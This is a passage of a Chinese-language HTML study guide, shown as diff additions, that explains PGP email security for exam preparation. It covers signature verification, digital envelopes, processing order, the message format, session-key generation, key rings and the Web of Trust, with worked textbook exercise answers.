+  <div class="step"><div class="sb">将经过签名的散列值（经过加密的散列值）<b>用发送者的公钥进行解密</b>，恢复出<b>发送者发送的散列值</b>。</div>
+    <div class="sw"><b>为什么用发送者的公钥：</b>因为签名是用发送者的私钥做的。公私钥必须配对使用。</div></div>
+  <div class="step"><div class="sb">将步骤 3 分解出的<b>消息输入单向散列函数计算散列值</b>。</div>
+    <div class="sw"><b>为什么：</b>这是"我自己算的指纹"，用来跟"他寄来的指纹"比对。</div></div>
+  <div class="step"><div class="sb">将步骤 4 得到的散列值与步骤 5 得到的散列值<b>进行对比</b>。</div></div>
+  <div class="step"><div class="sb"><b>相等则数字签名验证成功，不相等则验证失败。</b></div>
+    <div class="sw"><b>不等意味着什么：</b>要么邮件被改过（完整性破坏），要么不是这个人发的（真实性破坏）——<b>但分不清是哪一种</b>。</div></div>
+  <div class="step"><div class="sb">步骤 3 中分解出的消息<b>就是发送者发送的消息</b>。</div></div>
+</div>
+
+<div class="box trap">
+  <div class="box-t">⚠ 术语对照：同一步操作，教材里有三种叫法（考试和读图都会撞上）</div>
+  <table class="tight" style="margin:.3em 0">
+  <thead><tr><th style="width:26%">出现在哪</th><th style="width:32%">这一步被叫做什么</th><th>说的其实是</th></tr></thead>
+  <tbody>
+  <tr><td><span class="pref">PPT p.18 步骤 5</span>、图上标注</td><td>「数字签名（<b>加密</b>）」<br><span class="small">正文原话：这一步相当于使用私钥进行<b>加密</b></span></td><td rowspan="3"><b>同一件事</b>：用<b>发送者的私钥</b>，对<b>消息的散列值</b>做的那一次公钥运算。<br>反向那一次（用发送者<b>公钥</b>）同理。</td></tr>
+  <tr><td><span class="pref">PPT p.19 / p.22</span>、图上标注</td><td>「<b>验证签名</b>（解密）」</td></tr>
+  <tr><td><span class="bref">课本图 10-3、图 10-4</span></td><td>「<b>签名算法</b>」／「用 <b>PR_A 加密</b>（签名）」</td></tr>
+  </tbody>
+  </table>
+  <p><b>最准确的说法是「签名 / 验签」，不是「加密 / 解密」。</b>之所以能混着说，只是因为在 <b>RSA</b> 里这两种运算的数学形式恰好长得一样。</p>
+  <p><b>而且这个说法有个硬伤</b>：表 10-2 明写签名算法可以是 <b>DSS 或 RSA</b>，而 <b>DSS 只能签名、根本不能用来加密</b>。
+  所以读图时的正确做法是 —— <b class="mark">只看"用了谁的哪把钥匙、作用在什么数据上"，不要纠结那个动词叫什么。</b></p>
+  <p class="small"><b>速判口诀：</b>用<b>自己的私钥</b>作用在<b>散列值</b>上 ＝ 签名；用<b>对方的公钥</b>作用在<b>会话密钥</b>上 ＝ 加密（数字信封）。PGP 里公钥运算只有这两处。</p>
+</div>
+
+<h3>2.5 数字信封：为什么要"两把锁套着用" <span class="bref">课本 p.312–313</span></h3>
+
+<div class="scene">
+  <div class="scene-k">先想一分钟</div>
+  <p class="scene-q">既然 RSA 能加密，为什么不直接用 RSA 把整封邮件加密了事？</p>
+  <div class="scene-b"><p>因为<b>公钥算法慢</b>——基于大数模幂运算，比对称算法慢好几个数量级，长邮件根本扛不住。
+  可要是只用对称算法，又回到了老问题：<b>那把对称密钥怎么送给对方？</b>（这正是 <b>简答 11</b> 考的。）</p></div>
+</div>
+
+<div class="box key">
+  <div class="box-t">课本原文（可直接抄进卷子）<span class="bref">课本 p.312</span></div>
+  <p>「在加密方法上，PGP 用公开密码算法对<b>会话密钥 K<sub>s</sub></b> 进行加密（使用接收方的公钥 <b>PU<sub>B</sub></b>），
+  然后用对称密码算法对<b>压缩后的报文</b>进行加密（使用会话密钥 <b>K<sub>s</sub></b>）。
+  这种<b>链式加密方法（也称为"数字信封"）</b>既有公开密码体系的保密性，又有对称密码体系的高效性，
+  从而<b>既保证了邮件正文的机密性，又安全地传递了对称密码算法的密钥</b>。」</p>
+  <p>「另外，<b>会话密钥是发送方随机产生的，不需要和接收方协商密钥，且只用一次</b>，
+  即使偶然被泄露，也不会影响到下次邮件的发送过程。」</p>
+</div>
+
+<div class="box exam">
+  <div class="box-t">★ 单选 5「PGP 中，会话密钥的安全交换采用的技术称为」→ <b>A. 数字信封</b></div>
+  <p>另外三个选项要能一眼排除：<b>Diffie-Hellman</b> 是双方<b>协商</b>出密钥（PGP 不协商，是单方生成后送过去）；
+  <b>线下交换</b> 不现实；<b>KDC</b> 需要可信第三方在线（那是 Needham-Schroeder 的路子，PGP 没有 KDC）。</p>
+</div>
+<h3>2.6 老师的三道讨论题（PPT 提了问，下一页没答案）<span class="pref">PPT p.24–26</span></h3>
+
+<div class="box exam">
+  <div class="box-t">★ 为什么单独拎出来讲</div>
+  <p>这三道题<b>全是"为什么这样设计"，不是"是什么"</b> —— 正好是开卷考试最爱出的那一类：<b>翻书翻不到现成段落，必须理解。</b>
+  而且课本习题原封不动地又考了一遍（<b>单选 4、简答 2、简答 12</b>）。答案都在课本 p.312–313，下面逐条给全。</p>
+</div>
+
+<h4>讨论一：签名、加密、压缩的顺序问题 <span class="pref">PPT p.24</span> <span class="bref">课本 p.312</span></h4>
+
+<p><b>结论：先签名 → 再压缩 → 最后加密。</b>（这正是<b>单选 4 的答案 A</b>，也是你在课本 p.312 页眉上写的那句「顺序：先签名」。）</p>
+
+<div class="two">
+<div class="box">
+  <div class="box-t">① 为什么签名要排在压缩<b>之前</b>？（两点）</div>
+  <p><b>第一，便于验证。</b><span class="bref">课本原文</span>「是对<b>没压缩</b>的消息进行签名，<b>可便于对签名的验证</b>；
+  如果在压缩后再签名，则需要<b>保存压缩后的消息</b>，或在验证时<b>重新压缩消息</b>，增加了处理的工作量。」</p>
+  <p><b>第二，也是更硬的理由：ZIP 的结果不唯一。</b><span class="bref">课本原文</span>「由于压缩算法 ZIP 在<b>不同的实现</b>中会在<b>运算速度和压缩率之间寻求平衡</b>，
+  因而<b>可能会产生不同的压缩结果</b>（当然，直接解压结果是相同的），因此压缩后再签名就<b>可能导致无法实现鉴别</b>
+  （接收方在验证签名时可能会因压缩的原因而出现验证失败）。」</p>
+  <p class="small"><b>说人话：</b>签名是对"某一串确定的字节"按指纹算的。原文是唯一的，压缩包却不是——你我用不同版本的 ZIP 压同一份文件，得到的字节可能不一样，指纹自然对不上。所以<b>只能对原文签名</b>。</p>
+</div>
+<div class="box">
+  <div class="box-t">② 为什么压缩要排在加密<b>之前</b>？（两点）</div>
+  <p><span class="bref">课本原文</span>「PGP 对<b>加密前的明文（含签名）</b>进行压缩，而不是在加密后再压缩，主要原因也有两点：」</p>
+  <p><b>第一，省资源。</b>「先压缩再加密方案<b>缩短了报文大小</b>，从而减少了<b>网络传输时间和存储空间</b>。」</p>
+  <p><b>第二，更安全。</b>「经过压缩实际上是经过了一次变换，变换后<b>减少了明文中上下文的关系</b>，比原始消息的<b>冗余信息更少</b>，
+  <b>再加密的安全性更高</b>；而如果先加密，再压缩，效果会差一些。」</p>
+  <p class="small"><b>说人话：</b>密码分析靠的就是明文里的规律（重复的词、固定的格式）。压缩正好是"专门消灭重复"的工具，压完再加密，攻击者能抓的把柄就少了。<br>
+  <b>反过来还有个工程理由：</b>密文是接近随机的字节流，<b>根本压不动</b>——先加密再压缩等于白压。</p>
+</div>
+</div>
+
+<h4>讨论二：为什么要进行 Base64 编码？对性能的影响如何？ <span class="pref">PPT p.25</span> <span class="bref">课本 p.313</span></h4>
+
+<div class="box">
+  <p><b>为什么要编码：</b><span class="bref">课本原文</span>「在兼容性方面，加密后的报文使用 Base64 编码将报文<b>转换成 ASCII 字符串</b>，
+  主要考虑到<b>很多文件系统只允许使用 ASCII 字符组成的报文</b>。」</p>
+  <p class="small">→ 根因：加密和压缩的输出都是<b>任意二进制字节</b>，其中很多值在老式邮件系统里是非法的甚至有特殊含义（会被截断、被改写）。Base64 把它们映射进一个"绝对安全"的 64 个可打印字符的小圈子里。表 10-2 里这一行叫 <b>Radix 64</b>，<b>它就是 MIME 的 Base64</b>。</p>
+  <p><b>对性能的影响：</b><span class="bref">课本原文</span>「在实际应用中，使用 Base64 编码转换后将导致<b>消息大小增加 33%</b>
+  （<b>每 3 字节的二进制数据映射成 4 个 ASCII 字符</b>）。<b>由于加密前对消息进行了压缩，因此实际的性能下降幅度要小很多。</b>」</p>
+  <p class="small">→ <b>33% 这个数字要记住</b>，算法是 4÷3 − 1。答题时最好把三句话都写上：<b>膨胀 33% → 但前面压缩过 → 所以净影响小得多</b>。这是<b>简答 12</b> 的完整答案。</p>
+</div>
+
+<h4>讨论三：为什么要分段？会话密钥部分和签名部分在第几个报文段？ <span class="pref">PPT p.26</span> <span class="bref">课本 p.313</span></h4>
+
+<div class="box key">
+  <p><b>为什么要分段：</b><span class="bref">课本原文</span>「PGP 还需考虑电子邮件系统<b>文件设施对最大报文长度的限制</b>
+  （<b>一般为 50 000 字节</b>），因此，PGP 还需提供报文的<b>分段和重组</b>功能。」</p>
+  <p><b>在第几段：</b><span class="bref">课本原文</span>「<b>分段是在所有其他的处理（包括 Base64 编码转换）完成后才进行的</b>，因此，
+  <b class="mark">会话密钥部分和签名部分只在第一个报文段的开始位置出现一次</b>。」</p>
+  <p><b>接收端：</b>「PGP 必须<b>剥掉所有的电子邮件首部</b>，才能重新装配成原来的完整分组。」</p>
+  <p class="small">→ <b>为什么"分段放在最后"这一句是关键</b>：如果先分段再各自加密签名，那每一段都得自带一份会话密钥和签名，浪费不说，还得管 N 套密钥。
+  放在最后分，整封信只是被<b>机械地切成几截字符串</b>，所以那两样东西<b>天然只在第 1 段的开头</b>。<b>答这道题只要抓住"分段是最后一步"，结论自然就出来了。</b></p>
+</div>
+
+<h3>2.7 PGP 消息格式 <span class="pref">PPT p.27</span> <span class="bref">课本图 10-4</span></h3>
+
+<p><span class="bref">课本 p.313</span>：「根据图 10-3 所示的 PGP 工作过程，我们可以得到 PGP 传递的邮件消息格式，包括三部分：<b>报文、签名（可选）和会话密钥（可选）</b>。」<br>
+<span class="small">注意那两个<b>「可选」</b>：<span class="bref">课本 p.313</span>「实际应用中，<b>可以只实现部分安全属性</b>，以满足不同应用场景的需要。例如，只实现认证和机密性，或只实现机密性，或只实现认证等。」——只要机密性就没有签名部分，只要认证就没有会话密钥部分。</span></p>
+
+<figure>
+<svg viewBox="0 0 760 320" role="img" aria-label="PGP 消息格式">
+  <text x="245" y="14" font-size="12" font-weight="700" fill="#0e3d6e" text-anchor="middle">内 容</text>
+  <text x="630" y="14" font-size="12" font-weight="700" fill="#0e3d6e" text-anchor="middle">操 作</text>
+
+  <!-- 会话密钥部分 -->
+  <text x="12" y="60" font-size="11.5" font-weight="700" fill="#7a5a10">会话密钥部分</text>
+  <text x="12" y="76" font-size="10" fill="#7a5a10">（可选）</text>
+  <rect x="120" y="26" width="250" height="28" rx="3" fill="#faf5e6" stroke="#ddc98a"/>
+  <text x="245" y="45" font-size="11" text-anchor="middle">接收者的公钥标识（KID_B）</text>
+  <rect x="120" y="56" width="250" height="28" rx="3" fill="#faf5e6" stroke="#ddc98a"/>
+  <text x="245" y="75" font-size="11" text-anchor="middle">会话密钥（Ks）</text>
+
+  <!-- 签名部分 -->
+  <text x="12" y="150" font-size="11.5" font-weight="700" fill="#9d2f1c">签名部分</text>
+  <text x="12" y="166" font-size="10" fill="#9d2f1c">（可选）</text>
+  <rect x="120" y="94" width="250" height="26" rx="3" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="245" y="112" font-size="11" text-anchor="middle">时间戳</text>
+  <rect x="120" y="122" width="250" height="26" rx="3" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="245" y="140" font-size="11" text-anchor="middle">发送者的公钥标识（KID_A）</text>
+  <rect x="120" y="150" width="250" height="26" rx="3" fill="#fcf0ed" stroke="#e0b3a8"/>
+  <text x="245" y="168" font-size="11" text-anchor="middle">消息摘要的头两个字节</text>
+  <rect x="120" y="178" width="250" height="26" rx="3" fill="#fcf0ed" stroke="#9d2f1c" stroke-width="1.6"/>
+  <text x="245" y="196" font-size="11" font-weight="700" text-anchor="middle">消息摘要</text>
+
+  <!-- 报文部分 -->
+  <text x="12" y="250" font-size="11.5" font-weight="700" fill="#0e3d6e">报文部分</text>
+  <rect x="120" y="214" width="250" height="26" rx="3" fill="#eaf1f8" stroke="#a8c4de"/>
+  <text x="245" y="232" font-size="11" text-anchor="middle">文件名</text>
+  <rect x="120" y="242" width="250" height="26" rx="3" fill="#eaf1f8" stroke="#a8c4de"/>
+  <text x="245" y="260" font-size="11" text-anchor="middle">时间戳</text>
+  <rect x="120" y="270" width="250" height="26" rx="3" fill="#eaf1f8" stroke="#a8c4de"/>
+  <text x="245" y="288" font-size="11" text-anchor="middle">数据</text>
+
+  <!-- 操作括号 -->
+  <path d="M386,26 L396,26 L396,84 L386,84" fill="none" stroke="#9d2f1c" stroke-width="1.5"/>
+  <text x="402" y="52" font-size="10.5" font-weight="700" fill="#9d2f1c">用 PU_B 加密</text>
+  <text x="402" y="66" font-size="9.5" fill="#9d2f1c">（数字信封）</text>
+
+  <path d="M386,178 L396,178 L396,204 L386,204" fill="none" stroke="#9d2f1c" stroke-width="1.5"/>
+  <text x="402" y="188" font-size="10.5" font-weight="700" fill="#9d2f1c">用 PR_A 加密（签名）</text>
+  <text x="402" y="201" font-size="9.5" fill="#9d2f1c">只对消息摘要做</text>
+
+  <path d="M528,94 L538,94 L538,296 L528,296" fill="none" stroke="#14508c" stroke-width="1.5"/>
+  <text x="544" y="192" font-size="11" font-weight="700" fill="#14508c">ZIP</text>
+
+  <path d="M578,94 L588,94 L588,296 L578,296" fill="none" stroke="#14508c" stroke-width="1.5"/>
+  <text x="594" y="188" font-size="11" font-weight="700" fill="#14508c">用会话密钥</text>
+  <text x="594" y="201" font-size="11" font-weight="700" fill="#14508c">Ks 加密</text>
+
+  <path d="M672,26 L682,26 L682,296 L672,296" fill="none" stroke="#14508c" stroke-width="1.5"/>
+  <text x="688" y="155" font-size="11" font-weight="700" fill="#14508c">Base64</text>
+  <text x="688" y="168" font-size="11" font-weight="700" fill="#14508c">编码</text>
+
+  <rect x="8" y="302" width="744" height="16" rx="3" fill="#faf5e6" stroke="#ddc98a"/>
+  <text x="380" y="314" font-size="10.5" font-weight="700" fill="#7a5a10" text-anchor="middle">读法：括号越长，罩住的内容越多。Base64 罩住全部，Ks 和 ZIP 罩住「签名＋报文」，PU_B 只罩住会话密钥部分。</text>
+</svg>
+<figcaption>图 10-4 PGP 消息格式（据 PPT p.27 与课本图 10-4 重绘）</figcaption>
+</figure>
+
+<table class="tight">
+<thead><tr><th style="width:16%">部分</th><th style="width:40%">包含哪些字段（课本原文）</th><th>怎么保护的</th></tr></thead>
+<tbody>
+<tr><td><b>会话密钥部分</b><br><span class="small">（可选）</span></td><td>标识发送者加密会话密钥时所使用的<b>接收者的公钥标识（KID<sub>B</sub>）</b>和<b>会话密钥本身（K<sub>s</sub>）</b></td><td><b>用接收者公钥 PU<sub>B</sub> 加密</b><br><span class="small">← <b>不能</b>用 Ks 加密</span></td></tr>
+<tr><td><b>签名部分</b><br><span class="small">（可选）</span></td><td>产生签名的<b>时间戳</b>、<b>消息摘要</b>、<b>消息摘要的头两个字节</b>（作为消息的 <b>16 位校验序列</b>）、<b>发送者的公钥标识（KID<sub>A</sub>）</b>（根据这个标识可以找到对应的加密消息摘要的私钥）</td><td><b>消息摘要用 PR<sub>A</sub> 加密（＝签名）</b>；<br>整个签名部分再随报文一起 <b>ZIP → 用 K<sub>s</sub> 加密</b></td></tr>
+<tr><td><b>报文部分</b></td><td><b>文件名</b>、<b>消息产生的时间戳</b>、实际存储或传输的<b>数据</b></td><td><b>ZIP → 用 K<sub>s</sub> 加密</b></td></tr>
+<tr><td colspan="2"><b>最后，对整个消息</b></td><td><b>Base64 编码</b></td></tr>
+</tbody>
+</table>
+
+<div class="box exam">
+  <div class="box-t">★ 单选 6「PGP 消息中，<b>不能</b>用会话密钥加密的部分是」→ <b>B. 接收者的公钥标识</b></div>
+  <p><b>为什么必须是它</b>：KID<sub>B</sub> 的作用是<b>告诉接收者"用你的哪一把私钥来解会话密钥"</b>。
+  假如它自己也被会话密钥加密了，接收者就得<b>先有会话密钥才能读到它，而读它正是为了拿到会话密钥</b> —— 死循环。<br>
+  另外三个选项（邮件正文、签名、发送者的公钥标识 KID<sub>A</sub>）都在"签名＋报文"这一块里，全都是被 K<sub>s</sub> 加密的。<br>
+  <span class="small">顺带一提：<b>KID<sub>A</sub> 在签名部分、KID<sub>B</sub> 在会话密钥部分</b>，别记反了。判据是"谁的钥匙就跟着谁那件事走"。</span></p>
+</div>
+
+<h3>2.8 PGP 密钥管理 <span class="bref">课本 10.3.2（p.314–316）</span> <span style="color:#9d2f1c;font-weight:700">· PPT 未讲，但习题考了 6 道</span></h3>
+
+<div class="box trap">
+  <div class="box-t">⚠ 为什么这一节还要写</div>
+  <p>老师 PPT <b>一页都没提</b>，但课本习题在这里考了 <b>单选 7、11、12 + 简答 3、4、5</b> 共 6 道，
+  你自己也在课本 p.314 上圈了「<b>PGP 的密钥管理主要包括两部分</b>」并标了「简述」。
+  <b>这是"老师留给课本讲"的部分，不是"不考"的部分。</b></p>
+</div>
+
+<p><b>开篇这句话就是简答题的标准起手式</b><span class="bref">课本 p.314</span>：
+「PGP 的密钥管理主要包括<b>两部分</b>：一部分是<b>用作会话加密的会话密钥（对称加密算法的密钥）的管理</b>，
+另一部分是<b>用作数字签名和会话密钥保护的公开密钥的管理</b>。
+PGP 的每个用户都必须<b>妥善管理存储自己的公钥/私钥对的文件</b>，同时还必须<b>管理存储通信对象的公钥文件</b>。」</p>
+
+<h4>(1) 会话密钥的生成与管理 <span class="bref">课本 p.314</span> —— <b>简答 4 直接考</b></h4>
+
+<div class="steps">
+  <div class="step"><div class="sb">会话密钥 K<sub>s</sub> 由<b>伪随机数生成器 PRG</b> 产生，该 PRG 基于美国国家标准<b>「金融机构密钥管理（大规模）」ANSI X 9.17</b> 中定义的随机数生成方法，产生 <b>128 位</b>随机数，<b>只用于一条消息的一次加解密过程</b>。</div>
+    <div class="sw"><b>要记的数字：ANSI X 9.17、128 位、一次性。</b></div></div>
+  <div class="step"><div class="sb"><b>随机数产生器的输入</b>包括：<b>1 个 128 位密钥</b>，<b>2 个 64 位待加密的明文块（随机数种子）</b>。</div>
+    <div class="sw">即：一把钥匙 + 两块种子。</div></div>
+  <div class="step"><div class="sb"><b>随机数种子由键盘输入产生</b>（用户应尽量随机无规律地击键）：用户随机键入 <b>12 个字符</b>，每个字符表示成 <b>8 比特</b>的数值，<b>12 × 8 = 96 比特</b>，再加上表示<b>键入日期/时间的 32 比特</b>，形成<b>一个 128 比特的随机数据流</b>。</div>
+    <div class="sw"><b>96 + 32 = 128</b> —— 这个算式是简答 4 的得分点，务必写出来。为什么要人手敲？因为计算机自己产生不了真随机，得从人的击键节奏里"取熵"。</div></div>
+  <div class="step"><div class="sb">然后将此数据流<b>分成两个 64 比特的明文分组</b>，输入随机数产生器中。<b>128 位密钥为上一次算法输出的会话密钥。</b></div>
+    <div class="sw">这就是"上一次的输出当这一次的钥匙"，链条式往下滚。</div></div>
+  <div class="step"><div class="sb">随机数产生器根据输入的种子和密钥产生 <b>2 个 64 位密文块</b>，<b>串联起来形成 128 位的会话密钥</b>。</div>
+    <div class="sw"><span class="small">ANSI X 9.17 最开始规定的加密算法是 <b>DES</b>，后来在标准修订版或基于该标准的其他标准中增加了 <b>3DES、IDEA、CAST-128、AES</b> 等对称加密算法。</span></div></div>
+  <div class="step"><div class="sb"><b>如何安全交换</b>：会话密钥使用<b>接收方的公开密钥加密</b>后发送给接收方，接收方收到后用<b>自己的私钥解密</b>得到本次会话的会话密钥。</div>
+    <div class="sw"><b>PGP 通过这种方法实现了会话密钥的安全交换</b>（＝数字信封）。这一句是简答 4 的收尾。</div></div>
+</div>
+
+<h4>(2) 公开密码算法的密钥管理 <span class="bref">课本 p.314–315</span></h4>
+
+<p><span class="bref">课本原文</span>「PGP 采用公开密码机制来实现<b>会话密钥的交换</b>以及<b>数字签名</b>功能，因此必须提供<b>公钥和私钥的发布和管理机制</b>。」<br>
+关键的设计取舍：<b>「PGP 为了能够在各种环境中应用其加密方案，<b>没有采用严格（类似 PKI）的公钥管理方案</b>，而是<b>提供了一种解决公钥管理问题的框架</b>，并给出了几种可选的公钥管理方案供用户选择。」</b></p>
+
+<h5 style="margin:.6em 0 .2em;font-size:.98em">用户 A 获取用户 B 的公钥的四种方式</h5>
+<table class="tight">
+<thead><tr><th style="width:6%" class="c">#</th><th style="width:17%">方式</th><th>做法</th><th style="width:25%">评价</th></tr></thead>
+<tbody>
+<tr><td class="c">1</td><td><b>物理交付</b></td><td>B 把自己的公钥文件保存在磁盘或光盘等存储介质上，<b>直接亲手交给 A</b>。</td><td><b>非常安全，但实际使用不方便，因此很少用到。</b></td></tr>
+<tr><td class="c">2</td><td><b>电话验证</b></td><td>B 通过电子邮件向 A 发送自己的公钥文件；A 用 PGP 中的 <b>SHA-1 生成该公钥的 160 比特消息摘要</b>，并<b>以十六进制格式表示，作为该公钥的指纹</b>；A 通过电话先确认 B 的身份，再要求 B <b>在电话中口述其公钥的指纹</b>，如果相符，则 B 的公钥真实性得到验证。</td><td>用另一条<b>带外信道</b>（电话＋你认得的声音）来验证。指纹短，人能念得完。</td></tr>
+<tr><td class="c">3</td><td><b>通过可信的第三方</b><br><span class="small">（介绍人）</span></td><td>假定 C 是 A 和 B 都信赖的第三方（一般称其为<b>「介绍人」</b>），由 C 创建<b>包含 B 的公钥的签名证书</b>。证书中包括 B 的公钥、创建密钥的时间和密钥的有效期、<b>介绍人 C 的数字签名</b>等信息。C 的签名证书<b>可以直接由 B 或 C 发给 A，也可发布在指定的公告牌上</b>。</td><td><b>这就是"信任网"的原子操作</b> —— 见下方。</td></tr>
+<tr><td class="c">4</td><td><b>通过可信的认证中心 CA</b></td><td>可信的认证中心为用户 B 的公钥创建<b>数字签名证书</b>，A 可以向认证中心申请得到包含 B 的公钥的数字证书。</td><td>就是 X.509 那一套。<b>PGP 后来也支持 X.509 和 CA，但并没有被广泛采用。</b></td></tr>
+</tbody>
+</table>
+
+<h5 style="margin:.6em 0 .2em;font-size:.98em">公钥环与私钥环 <span class="bref">课本 p.315</span></h5>
+<dl class="kv">
+<dt>公钥环 public key ring</dt><dd>存储<b>该用户知道的其他用户的公钥</b>。</dd>
+<dt>私钥环 private key ring</dt><dd>存储<b>用户自己的所有公钥/私钥对</b>。</dd>
+<dt>都用什么存</dt><dd><b>均用表型数据结构存储</b>（如图 10-3 所示）。</dd>
+<dt>为什么允许一人多对</dt><dd>「PGP 允许一个用户同时拥有多个公钥/私钥对，主要目的有两个：<br>
+① <b>经常变换密钥，以增强安全性</b>；② <b>多个密钥对可以支持同一时刻与多个用户进行通信。</b>」</dd>
+<dt>密钥标识 Key ID</dt><dd>「为了提高效率，PGP 采用<b>密钥标识符（密钥 ID，Key ID）</b>来表示密钥，并建立密钥标识和对应公钥/私钥间的映射关系。<br>
+<b>用公钥中 64 个最低有效位表示该密钥的标识符</b>，由于 <b>2<sup>64</sup></b> 数量很大，因而<b>不同的密钥 ID 相重的概率极小</b>。<br>
+PGP 采用<b>传输比公钥长度小得多的密钥 ID，而不是公钥本身</b>，<b>既节省了空间，同时也能告诉接收方通信所使用的密钥。</b>」</dd>
+</dl>
+
+<h5 style="margin:.6em 0 .2em;font-size:.98em">私钥是怎么被保护起来的 <span class="bref">课本 p.315</span></h5>
+<div class="steps">
+  <div class="step"><div class="sb">用户首先选择一个<b>加密私钥的口令短语（passphrase）p</b>。</div>
+    <div class="sw"><b>为什么：</b>私钥是一长串随机字节，人记不住；口令是人能记住的。要把两者挂上钩。</div></div>
+  <div class="step"><div class="sb">系统利用 <b>RSA 或 Diffie-Hellman</b> 生成一对新的公钥/私钥对时，要求用户<b>输入口令短语作为 SHA-1 的输入，产生一个 160 比特的消息摘要 h(p)</b>，然后<b>销毁口令短语</b>。</div>
+    <div class="sw"><b>为什么要销毁：</b>内存里留着口令＝留着后门。</div></div>
+  <div class="step"><div class="sb">系统用上一步产生的 <b>160 比特消息摘要值作为密钥</b>，利用<b>对称加密算法 CAST-128（或 IDEA、3DES、AES）对密钥对中私钥部分加密</b>，并把加密结果<b>存储在私钥环中</b>，然后<b>销毁用作密钥的消息摘要值</b>。</div>
+    <div class="sw"><b>结果：</b>私钥环里躺着的是<b>私钥的密文</b>。硬盘被拷走也没用。</div></div>
+  <div class="step"><div class="sb"><b>用的时候</b>：用户需要使用私钥来加密或签名时，<b>查询私钥环，输入口令短语，计算口令短语的消息摘要值</b>，并以此 160 比特的消息摘要作为密钥<b>解密私钥密文，从而获得私钥</b>。</div>
+    <div class="sw">这正好解释了 §2.4 里"解密/签名流程的头 3 步为什么都在折腾口令"。</div></div>
+</div>
+
+<h4>(3) 信任模型：信任网 Web of Trust <span class="bref">课本 p.315–316</span> —— <b>单选 7、11、12 与简答 3、5 全在这里</b></h4>
+
+<div class="scene">
+  <div class="scene-k">这一小节要回答的问题</div>
+  <p class="scene-q">没有 CA，我凭什么相信手上这把"某某的公钥"真是他的？</p>
+  <div class="scene-b"><p>X.509 的答案是"往上问权威"；<b>PGP 的答案是"问你信得过的熟人"</b>。</p></div>
+</div>
+
+<p><b>课本原文（可直接抄）</b><span class="bref">课本 p.315</span>：「在信任关系的建立上，PGP 主要采用<b>以用户为中心的信任模型</b>（参见 4.3.1 节），
+也就是<b>信任网模型（Web of Trust）</b>。该模型中，<b>没有一个统一的认证中心来管理用户公钥，每个人都可以作为一个 CA 对某个用户的公钥签名</b>，
+以此来说明这个公钥是否有效（可信）。」</p>
+
+<p><b>PGP 中对公钥的信任基于两点</b>：「一是<b>直接来自你所信任的人的公钥</b>；二是<b>由你所信任的人为某个你并不熟悉的人所签署的公钥</b>。
+也就是说，PGP 的用户在得到一个公钥后，<b>首先检验其数字签名，如果该公钥的数字签名是由你信任的人签署的，就认为此公钥是合法可信的</b>。
+这样，由你认识且信任的人，就可以和众多不认识的人建立一个<b>网状的信任模型</b>（称为"信任网"）。」</p>
+
+<h5 style="margin:.6em 0 .2em;font-size:.98em">公钥环里每个公钥项的三个信任度字段 <span class="bref">课本 p.316</span></h5>
+<table class="tight">
+<thead><tr><th style="width:20%">字段</th><th style="width:32%">指示什么</th><th style="width:16%">谁来定</th><th>取值</th></tr></thead>
+<tbody>
+<tr><td><b>① 密钥合法性字段</b></td><td>指示 PGP 对<b>这个实体公钥合法性</b>的信任程度</td><td><b>PGP 算出来</b><br><span class="small">（根据该公钥的签名证书的签名可信性字段计算得到）</span></td><td><b>合法 / 不合法</b></td></tr>
+<tr><td><b>② 签名可信性字段</b></td><td>指示 PGP 对<b>签名者</b>的信任程度</td><td><b>PGP 算出来</b><br><span class="small">（从公钥环里查签名者的"拥有者可信性"抄过来）</span></td><td>同下面的四档</td></tr>
+<tr><td><b>③ 拥有者可信性字段</b></td><td>指示<b>使用该公钥签署其他公钥证书</b>的可信程度</td><td><b class="mark">该字段值由用户自己指定</b></td><td><b>不信任 / 部分信任 / 一直信任 / 绝对信任</b></td></tr>
+</tbody>
+</table>
+
+<div class="box">
+  <div class="box-t">三个字段是怎么互相喂数据的（这是理解本节的钥匙）</div>
+  <p><b>拥有者可信性（你手工设）→ 签名可信性（PGP 抄）→ 密钥合法性（PGP 算）</b>。</p>
+  <p><b>签名可信性字段的赋值方法</b><span class="bref">课本 p.316</span>：「一个公钥可以有一个或多个签名证书，当为该公钥插入一个签名到公钥环中时，
+  PGP 首先<b>搜索公钥环，查找签名者是否是已知公钥的拥有者</b>。<b>如果是，则将拥有者可信性字段中的标志赋给签名可信性字段；否则，将签名可信性字段赋值为不信任。</b>」</p>
+  <p><b>插入新公钥时</b>：「当用户 A 往公钥环中插入一个新的公钥时，PGP 必须为该公钥的<b>拥有者可信性字段设定一个标志</b>。
+  <b>如果用户 A 插入的新公钥是自己的，则它也将被插入到用户 A 的私钥环中，PGP 自动指定其密钥合法性字段标志为「密钥合法」，拥有者可信性字段标志为「绝对信任」；否则，PGP 将询问用户 A，让用户给定信任级别。</b>」</p>
+</div>
+
+<div class="box exam">
+  <div class="box-t">★ 三道选择题一次性解决</div>
+  <p><b>单选 7</b>「PGP 主要采用的信任模型是」→ <b>A. 用户为中心的信任模型</b>。<span class="small">（B「信任树」是 X.509 那套；D「Web 模型」是浏览器根证书模型，别被"Web of Trust"里的 Web 带偏。）</span></p>
+  <p><b>单选 11</b>「插入新公钥时，应该由（　）来指定该公钥的拥有者的可信性字段值」→ <b>A. 用户</b>。<span class="small">判据：三个字段里<b>只有拥有者可信性是人工指定的</b>，另两个都是 PGP 算的。</span></p>
+  <p><b>单选 12</b>「只有当（　）时，该公钥的拥有者可信性字段值一定是"绝对信任"」→ <b>B. 该公钥是用户 A 自己的公钥</b>。<span class="small">判据：只有插入自己的公钥时 PGP 才<b>自动</b>置为绝对信任，别人的一律要问你。</span></p>
+</div>
+
+<h5 style="margin:.6em 0 .2em;font-size:.98em">密钥合法性字段的取值计算 <span class="bref">课本 p.316</span> —— <b>简答 5</b></h5>
+
+<div class="box key">
+  <p><b>课本原文</b>：「密钥合法性字段的取值<b>由此公钥的所有签名的签名可信性字段的取值计算得到</b>。具体计算方法如下：</p>
+  <p>① <b>如果该公钥的签名可信性字段中至少有一个标志为「绝对信任」，则将此公钥的密钥合法性字段标志为「合法」</b>；</p>
+  <p>② <b>否则，PGP 计算所有签名信任值的加权和</b>，即：签名可信性字段标志为<b>「一直信任」的权重为 1/X</b>，标志为<b>「部分信任」的权重为 1/Y</b>。其中，<b>X 和 Y 是用户设置的参数</b>。
+  <b>当该公钥的签名可信性字段的加权和等于或大于 1 时，则将密钥合法性字段标志为「合法」，即公钥是有效的。</b>」</p>
